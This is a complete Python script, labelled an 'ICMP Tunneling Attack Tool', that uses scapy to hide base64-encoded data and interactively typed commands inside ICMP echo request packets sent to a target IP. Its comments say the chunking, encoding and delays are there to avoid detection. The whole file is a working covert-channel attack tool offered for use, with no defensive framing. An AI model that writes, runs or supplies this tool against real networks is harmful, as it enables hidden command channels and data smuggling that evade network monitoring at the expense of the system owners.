#!/usr/bin/env python3
from scapy.all import IP, ICMP, Raw, send
import argparse
import base64
import logging
import time
import sys
from typing import Optional

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class ICMPTunnelAttack:
    def __init__(self, target_ip: str):
        """
        Initialize ICMP tunnel attacker
        
        Args:
            target_ip (str): Target machine IP address
        """
        self.target_ip = target_ip
        self.sequence = 0
        self.chunk_size = 32  # Size of data chunks to embed
        
    def encode_payload(self, data: str) -> str:
        """
        Encode payload to avoid detection
        
        Args:
            data (str): Data to encode
            
        Returns:
            str: Encoded data
        """
        # Add marker to identify our tunnel packets
        marked_data = f"ICMP_TUNNEL:{data}"
        return base64.b64encode(marked_data.encode()).decode()
        
    def create_ping_packet(self, data: str) -> IP:
        """
        Create ICMP echo request with embedded data
        
        Args:
            data (str): Data to embed
            
        Returns:
            IP: Crafted packet
        """
        self.sequence = (self.sequence + 1) % 65536
        
        return IP(dst=self.target_ip)/ICMP(
            type=8,  # Echo Request
            id=0x1337,  # Specific ID for our tunnel
            seq=self.sequence
        )/Raw(load=data)
        
    def send_data(self, data: str, delay: float = 0.5) -> None:
        """
        Send data through ICMP tunnel
        
        Args:
            data (str): Data to send
            delay (float): Delay between packets
        """
        # Encode the full payload
        encoded_data = self.encode_payload(data)
        
        # Split into chunks to avoid suspiciously large packets
        chunks = [encoded_data[i:i+self.chunk_size] 
                 for i in range(0, len(encoded_data), self.chunk_size)]
        
        # Send chunks with sequence numbers
        for i, chunk in enumerate(chunks):
            # Add chunk metadata
            chunk_data = f"{i}/{len(chunks)}:{chunk}"
            packet = self.create_ping_packet(chunk_data)
            
            try:
                send(packet, verbose=False)
                logging.info(f"Sent chunk {i+1}/{len(chunks)}")
                time.sleep(delay)  # Add delay to avoid detection
                
            except Exception as e:
                logging.error(f"Failed to send chunk {i+1}: {e}")
                
    def start_interactive(self) -> None:
        """
        Start interactive command sending mode
        """
        logging.info("Starting interactive ICMP tunnel mode")
        logging.info("Enter commands to send (Ctrl+C to exit)")
        
        try:
            while True:
                command = input("\nCommand > ").strip()
                if command:
                    if command.lower() == "exit":
                        break
                    self.send_data(command)
                    
        except KeyboardInterrupt:
            logging.info("\nExiting interactive mode")
            
def main():
    parser = argparse.ArgumentParser(
        description='ICMP Tunneling Attack Tool'
    )
    parser.add_argument(
        'target_ip',
        help='Target IP address'
    )
    parser.add_argument(
        '-m', '--message',
        help='One-time message to send'
    )
    parser.add_argument(
        '-d', '--delay',
        type=float,
        default=0.5,
        help='Delay between packets in seconds'
    )
    
    args = parser.parse_args()
    
    tunnel = ICMPTunnelAttack(args.target_ip)
    
    if args.message:
        # Send single message
        tunnel.send_data(args.message, args.delay)
    else:
        # Start interactive mode
        tunnel.start_interactive()

if __name__ == "__main__":
    main()